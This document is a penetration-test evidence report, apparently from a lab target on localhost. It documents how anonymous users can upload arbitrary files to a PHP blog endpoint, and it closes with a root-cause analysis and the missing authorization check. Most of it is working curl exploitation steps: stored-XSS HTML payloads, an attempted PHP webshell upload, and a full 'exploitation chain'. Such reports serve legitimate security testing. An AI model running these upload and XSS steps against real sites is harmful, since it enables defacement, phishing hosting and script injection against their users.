# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Vertical Privilege Escalation - Unauthorized File Upload by Anonymous Users

**Summary:**
- **Vulnerable location:** POST /posts/upload-article.php
- **Overview:** Anonymous (unauthenticated) users can upload arbitrary files to the server without any authentication or authorization checks. This represents a critical vertical privilege escalation where the lowest-privilege role (anonymous/unauthenticated) can perform privileged operations (file upload to server filesystem) that should require administrative or moderator privileges.
- **Impact:** Unauthorized file hosting, disk space exhaustion, stored XSS attacks, content injection, and potential website defacement. Attackers can upload malicious HTML files with embedded JavaScript to conduct phishing attacks or deliver malware.
- **Severity:** HIGH

**Prerequisites:**
None. This vulnerability is directly exploitable by any anonymous user with network access to the application.

**Exploitation Steps:**

1. **Verify the upload form is accessible without authentication:**
```bash
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" http://localhost:36367/posts/upload-article.php
```
**Expected Result:** HTTP Status: 200
**Actual Result:** HTTP 200 - Form accessible to anonymous users

2. **Create a test file to upload:**
```bash
cat > /tmp/authz_test.html << 'TESTFILE'
<html>
<head><title>AUTHZ Test File</title></head>
<body>
<h1>Unauthorized File Upload Test</h1>
<p>This file was uploaded by an anonymous user without any authentication or authorization.</p>
</body>
</html>
TESTFILE
```

3. **Perform unauthorized file upload as anonymous user:**
```bash
curl -X POST http://localhost:36367/posts/upload-article.php \
  -F "name=Anonymous Attacker" \
  -F "email=attacker@example.com" \
  -F "articleFile=@/tmp/authz_test.html"
```
**Expected Result:** File upload succeeds without authentication
**Actual Result:** HTTP 200 with success message "Thank you for submitting your article, we will review it shortly."

4. **Verify the uploaded file is accessible:**
```bash
curl -s http://localhost:36367/posts/uploads/authz_test.html
```
**Expected Result:** File content is returned via HTTP
**Actual Result:** 
```html
<html>
<head><title>AUTHZ Test File</title></head>
<body>
<h1>Unauthorized File Upload Test</h1>
<p>This file was uploaded by an anonymous user without any authentication or authorization.</p>
</body>
</html>
```

5. **Verify HTTP headers confirm successful file hosting:**
```bash
curl -I http://localhost:36367/posts/uploads/authz_test.html
```
**Expected Result:** HTTP 200 with appropriate content-type headers
**Actual Result:**
```
HTTP/1.1 200 OK
Server: Apache/2.4.54 (Debian)
Content-Type: text/html
Content-Length: 235
```

**Proof of Impact:**

**Impact Demonstration 1: Arbitrary File Type Upload**
```bash
# Create and upload text file
echo "This is a test text file uploaded by an anonymous user" > /tmp/test.txt
curl -X POST http://localhost:36367/posts/upload-article.php \
  -F "name=Test" \
  -F "email=test@test.com" \
  -F "articleFile=@/tmp/test.txt"

# Verify accessibility
curl -s http://localhost:36367/posts/uploads/test.txt
```
**Result:** Text file successfully uploaded and accessible, demonstrating any file type is accepted.

**Impact Demonstration 2: Stored XSS via Malicious HTML Upload**
```bash
# Create malicious HTML file with embedded JavaScript
cat > /tmp/xss_payload.html << 'XSS'
<!DOCTYPE html>
<html>
<head><title>Privilege Escalation Proof</title></head>
<body>
<h1>CRITICAL: Vertical Privilege Escalation Demonstrated</h1>
<p><strong>Vulnerability:</strong> Anonymous file upload without authentication</p>
<p><strong>Uploaded by:</strong> Unauthenticated user</p>
<p><strong>Impact:</strong> Arbitrary file hosting, potential XSS, content injection</p>
<script>
  document.body.style.backgroundColor = '#ff0000';
  console.log('XSS payload executed - uploaded by anonymous user');
</script>
</body>
</html>
XSS

# Upload malicious payload
curl -X POST http://localhost:36367/posts/upload-article.php \
  -F "name=Attacker" \
  -F "email=test@evil.com" \
  -F "articleFile=@/tmp/xss_payload.html"

# Verify malicious content is hosted
curl -s http://localhost:36367/posts/uploads/xss_payload.html
```
**Result:** Malicious HTML file with JavaScript is successfully uploaded and accessible at `http://localhost:36367/posts/uploads/xss_payload.html`. When a victim visits this URL, the JavaScript executes in their browser context, demonstrating stored XSS capability.

**Impact Demonstration 3: Verification of .htaccess Partial Mitigation**
```bash
# Create PHP webshell
cat > /tmp/test_webshell.php << 'PHP'
<?php
echo "PHP code is executing";
phpinfo();
?>
PHP

# Upload PHP file
curl -X POST http://localhost:36367/posts/upload-article.php \
  -F "name=Test" \
  -F "email=test@test.com" \
  -F "articleFile=@/tmp/test_webshell.php"

# Attempt to execute PHP code
curl -s http://localhost:36367/posts/uploads/test_webshell.php
```
**Result:** PHP file uploads successfully (confirming the authorization vulnerability), but .htaccess prevents execution - file is served as plain text instead of executing. This demonstrates that while remote code execution is mitigated, the core authorization vulnerability (unauthorized file upload) remains exploitable.

**Complete Exploitation Chain:**

The following sequence demonstrates full exploitation from reconnaissance to impact:

```bash
# Step 1: Reconnaissance - Verify target accessibility
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" http://localhost:36367/posts/upload-article.php
# Result: 200 (accessible)

# Step 2: Weaponization - Create malicious payload
cat > /tmp/exploit.html << 'PAYLOAD'
<!DOCTYPE html>
<html><body>
<h1>Malicious Content Hosted via Authorization Bypass</h1>
<script>alert('Stored XSS from anonymous upload')</script>
</body></html>
PAYLOAD

# Step 3: Delivery - Upload without authentication
curl -X POST http://localhost:36367/posts/upload-article.php \
  -F "name=Attacker" \
  -F "email=evil@attacker.com" \
  -F "articleFile=@/tmp/exploit.html"
# Result: HTTP 200 - Upload successful

# Step 4: Exploitation - Access uploaded malicious content
curl -s http://localhost:36367/posts/uploads/exploit.html
# Result: Malicious content is accessible and would execute in victim browsers

# Step 5: Impact - Demonstrate privilege escalation
# Anonymous user (privilege level 0) successfully performed file upload operation
# that should require admin/moderator privileges (privilege level 2-3)
```

**Root Cause Analysis:**

Examining the vulnerable code at `/var/www/html/posts/upload-article.php`:

```php
// Line 8-27: File upload processing
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = trim($_POST["name"]);
    $email = trim($_POST["email"]);
    
    // Input validation for name and email (lines 10-21)
    // ... validation code ...
    
    // File upload processing (lines 24-27)
    if (isset($_FILES["articleFile"]) && $_FILES["articleFile"]["error"] == 0) {
        $target_dir = "./uploads/";
        $target_file = $target_dir . basename($_FILES["articleFile"]["name"]);
        move_uploaded_file($_FILES["articleFile"]["tmp_name"], $target_file);
        // ^^^ CRITICAL: No authorization check before this privileged operation
    }
}
```

**Missing Security Controls:**
1. No `session_start()` call to establish authentication context
2. No `$_SESSION['user_id']` check to verify user is authenticated  
3. No role verification (e.g., `$_SESSION['role'] === 'admin'`)
4. No authorization guard between validation (line 24) and privileged operation (line 27)

**What Should Be Present:**
```php
// Required authorization check (MISSING from current code):
session_start();
if (!isset($_SESSION['user_id'])) {
    http_response_code(401);
    die("Authentication required");
}
if ($_SESSION['role'] !== 'admin' && $_SESSION['role'] !== 'moderator') {
    http_response_code(403);
    die("Insufficient privileges - admin or moderator role required");
}
// Only after authorization check should file upload proceed
```

**Notes:**

**Partial Mitigation Present:**
The `/posts/uploads/.htaccess` file contains: `<FilesMatch "\.php$"> SetHandler none </FilesMatch>`

This prevents direct PHP code execution in the uploads directory, mitigating remote code execution risk. However, this does NOT address the core authorization vulnerability - anonymous users can still:
- Upload arbitrary HTML files with XSS payloads
- Consume disk space with large file uploads  
- Host malicious content for phishing or malware distribution
- Overwrite existing files if filenames collide

**Business Impact:**
- **Confidentiality:** LOW - No direct data exfiltration, but uploaded content could be used for phishing
- **Integrity:** HIGH - Attackers can inject malicious content into the application's web directory
- **Availability:** MEDIUM - Disk exhaustion possible through repeated large file uploads
- **Reputation:** HIGH - Malicious content hosted on organization's domain damages trust

**Remediation Priority:** HIGH - This is a fundamental authorization flaw that violates the principle of least privilege and enables multiple attack vectors.